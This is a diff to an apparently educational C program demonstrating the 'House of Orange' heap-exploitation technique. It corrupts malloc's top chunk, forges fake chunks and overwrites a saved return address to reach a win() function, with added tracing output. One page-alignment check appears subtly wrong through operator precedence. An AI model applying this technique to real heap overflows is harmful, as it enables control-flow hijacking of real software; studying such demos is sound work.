@@ -6,7 +6,10 @@
 #include <stdint.h>
 #include <stdio.h>
 #include <stdlib.h>
-#include <string.h>
+
+#define WHATEVER 0xbadbeef
+
+#define STREAM stdout
 
 /* myprinter prints without using nor affecting the heap */
 #ifndef DISABLE_MYPRINTER
@@ -19,11 +22,8 @@
 # define U(x) ((int) (x))
 #endif
 
-#define STREAM stdout
-
 #define colored_printf(fmt, ...) \
   myfprintf(STREAM, "\e[33m" fmt "\e[m", ##__VA_ARGS__)
-
 
 /* ----------- MALLOC ----------- */
 struct chunk {
@@ -46,33 +46,37 @@ struct chunk {
 /* ----------- Helpers ---------- */
 void print_hex_contents (void * addr, size_t count)
 {
-  colored_printf(XT ": ", U(addr));
+  colored_printf(XT ":\n", U(addr));
   for (size_t i = 0; i < count; ++i) {
+    if (!(i % sizeof(void *)))
+      colored_printf("| ");
     colored_printf(BT " ", U(((char *) addr)[i]));
   }
-  colored_printf("\n");
+  colored_printf("|\n");
 }
 
 #define print_struct_ptr(x) \
 do { \
-  colored_printf(#x ":\n"); \
+  colored_printf(#x " at "); \
   print_hex_contents(x, sizeof(*x)); \
 } while (0)
 
-void colored_memcpy (char * dst, const char * src, size_t len)
-{
-  print_hex_contents(dst, len);
-  colored_printf("\t\\-->\n");
-  memcpy(dst, src, len);
-  print_hex_contents(dst, len);
-}
-
-#define set(dst, src) \
+#define set(lhs, rhs) \
 do { \
-  typeof(src) _src = src; \
-  colored_printf(XT ": " XT " <- " XT "\n", U(&dst), U(dst), U(_src)); \
-  dst = _src; \
+  typeof(lhs) _eval = (typeof(lhs)) (rhs); \
+  myfprintf(STREAM, XT ": " XT " <- " XT " (= " #rhs ")\n", \
+    U(&lhs), U(lhs), U(_eval)); \
+  lhs = _eval; \
 } while (0)
+
+#define declare(lhs_ty, lhs_name, rhs) \
+  lhs_ty lhs_name; \
+  { \
+    lhs_ty _eval = rhs; \
+    myfprintf(STREAM, #lhs_ty " " #lhs_name " = " #rhs " = " XT "\n", \
+      _eval); \
+    lhs_name = _eval; \
+  }
 
 intptr_t get_ebp (void) { __asm__("movl (%esp), %eax"); }
 /* ----------- Helpers ---------- */
@@ -81,7 +85,7 @@ intptr_t get_ebp (void) { __asm__("movl (%esp), %eax"); }
 /* Getting eip to point here means the exploitation was successful */
 __attribute__((noreturn)) void win (void)
 {
-  myfprintf(stdout, "PWNED! Good job :)\n");
+  myfprintf(stdout, "\nYou won! Good job :)\n");
   exit(EXIT_SUCCESS);
 }
 
@@ -91,24 +95,27 @@ void lose (void) { myfprintf(stderr, "Exploit failed.\n"); }
 void houseoforange (void)
 {
 /* 1) Chunk next to top */
-  void * mem = malloc(1); /* contiguous to top */
-  myfprintf(STREAM, "Allocated mem contiguous to top at " XT ".\n", U(mem));
+  declare(void *, mem, malloc(1));
 
   struct chunk * top = (struct chunk *) mem_get_next_chunk(mem);
+
+  myfprintf(STREAM, "\nAllocated mem contiguous to top.\n");
   print_struct_ptr(top);
 
   myfprintf(STREAM,
-    "As long as the (3) last nibbles of top.sz = " XT
-    " remain unchanged, malloc won't complain.\n", U(top->sz));
+    "The 3 last nibbles of top->sz = " XT " must not change.\n", U(top->sz));
   size_t new_top_size = top->sz & (PAGE_SZ - 1);
 
 /* 2) Overflow it to corrupt top's size */
+  myfprintf(STREAM, "\nOverflow => ");
   set(top->sz, new_top_size);
   print_struct_ptr(top);
 
 /* 3) Malloc of slightly big size: around PAGE_SZ = 0x1000 */
-  myfprintf(STREAM,
-    "Allocation answered in new heap at " XT ".\n", U(malloc(PAGE_SZ)));
+  declare(void *, new_mem, malloc(PAGE_SZ));
+  if ((uintptr_t) mem_get_chunk(new_mem) & (PAGE_SZ - 1) == 0)
+    colored_printf("Allocation answered in new heap.\n", U(malloc(PAGE_SZ)));
+
   /*
    * Since PAGE_SZ > new_top_size, a new heap (and a new top) are allocated
    * from the system.
@@ -126,7 +133,7 @@ void houseoforange (void)
   struct chunk fake1, fake2;
 
   fake1.sz = fake2.sz = 0x11; /* MIN_SIZE | PREV_INUSE */
-  // fake1.prev_sz = fake2.prev_sz = 0; /* doesn't matter */
+  fake1.prev_sz = fake2.prev_sz = WHATEVER;
 
   fake1.bk = (void *) &fake2;
   fake2.fd = (void *) &fake1;
@@ -134,21 +141,27 @@ void houseoforange (void)
 
 /* 4) Overflow again to corrupt top's bk ptr *
  * (leave the other fields as they are)      */
-  set(old_top->bk, (void *) &fake1);
+  myfprintf(STREAM, "\nOverflow => ");
+  set(old_top->sz, new_top_size);
+  myfprintf(STREAM, "            ");
+  set(old_top->fd, WHATEVER);
+  myfprintf(STREAM, "            ");
+  set(old_top->bk, &fake1);
+
   fake1.fd = (void *) old_top;
-  /* We got &old_top->bk->fd == &old_top */
+  /* We got old_top->bk->fd == old_top */
+  print_struct_ptr(&fake1);
 
   print_struct_ptr(old_top);
-  intptr_t * array = malloc(1);      /* HoL => we get a 'corrupted' addr */
-  myfprintf(STREAM, "array at " XT "\n", U(array));
-  print_struct_ptr(old_top);
+  declare(intptr_t *, array, malloc(1)); /* HoL => we get a 'corrupted' addr */
 
   /* array should now be pointing to the stack, thus near the saved eip */
   intptr_t offset_to_eip_idx =
     1 + (get_ebp() - (intptr_t) array) / sizeof(intptr_t);
   if (offset_to_eip_idx < 0x100) {
-    colored_printf("Offset to IP = " BT " words\n", offset_to_eip_idx);
-    set(array[offset_to_eip_idx], (intptr_t) &win);
+    myfprintf(STREAM, "\narray[" BT "] <- " XT " (= &win)\n",
+      U(offset_to_eip_idx), U(&win));
+    array[offset_to_eip_idx] = (intptr_t) &win;
   }
 }
 
